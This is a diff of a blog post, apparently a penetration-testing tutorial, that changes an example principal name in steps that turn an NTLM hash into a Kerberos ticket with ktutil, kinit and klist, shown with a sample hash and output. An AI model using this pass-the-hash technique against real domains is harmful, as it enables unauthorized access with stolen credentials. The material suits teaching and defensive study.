@@ -26,12 +26,12 @@
 
 &lt;p&gt;At the &lt;code&gt;ktutil&lt;/code&gt; prompt, type in the &amp;ldquo;add entry&amp;rdquo; (&lt;code&gt;addent&lt;/code&gt;) command with the &amp;ldquo;principle&amp;rdquo; (&lt;code&gt;-p&lt;/code&gt;) flag. Specify the user and an all uppercase version of the FQDN. Then the &amp;ldquo;KVNO&amp;rdquo; (&lt;code&gt;-k 1&lt;/code&gt;), which is the key number. Finally the encryption type, which is &lt;code&gt;rc4-hmac&lt;/code&gt; for NTLM hashes:&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;ktutil: addent -p administrator@CORP.SOMEWHATREALNEWS.COM -k 1 -key -e rc4-hmac
+&lt;pre&gt;&lt;code&gt;ktutil: addent -p uberuser@CORP.SOMEWHATREALNEWS.COM -k 1 -key -e rc4-hmac
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;After you hit enter you&amp;rsquo;ll get prompted for the rc4-hmac (NTLM) hash:&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;Key for administrator@CORP.SOMEWHATREALNEWS.COM (hex): 88e4d9fabaecf3dec18dd80905521b29
+&lt;pre&gt;&lt;code&gt;Key for uberuser@CORP.SOMEWHATREALNEWS.COM (hex): 88e4d9fabaecf3dec18dd80905521b29
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Then we write the keytab file to disk and exit &lt;code&gt;ktutil&lt;/code&gt;&lt;/p&gt;
@@ -42,9 +42,9 @@ ktutil: exit
 
 &lt;p&gt;The last step before we can use our authentication is to create a kerberos ticket using our keytab file.&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;root@wpad:~# kinit -V -k -t /tmp/a.keytab -f administrator@CORP.SOMEWHATREALNEWS.COM
+&lt;pre&gt;&lt;code&gt;root@wpad:~# kinit -V -k -t /tmp/a.keytab -f uberuser@CORP.SOMEWHATREALNEWS.COM
 Using default cache: /tmp/krb5cc_0
-Using principal: administrator@CORP.SOMEWHATREALNEWS.COM
+Using principal: uberuser@CORP.SOMEWHATREALNEWS.COM
 Using keytab: /tmp/a.keytab
 Authenticated to Kerberos v5
 &lt;/code&gt;&lt;/pre&gt;
@@ -53,7 +53,7 @@ Authenticated to Kerberos v5
 
 &lt;pre&gt;&lt;code&gt;root@wpad:~# klist
 Ticket cache: FILE:/tmp/krb5cc_0
-Default principal: administrator@CORP.SOMEWHATREALNEWS.COM
+Default principal: uberuser@CORP.SOMEWHATREALNEWS.COM
 
 Valid starting       Expires              Service principal
 07/22/2018 21:38:43  07/23/2018 07:38:43  krbtgt/CORP.SOMEWHATREALNEWS.COM@CORP.SOMEWHATREALNEWS.COM
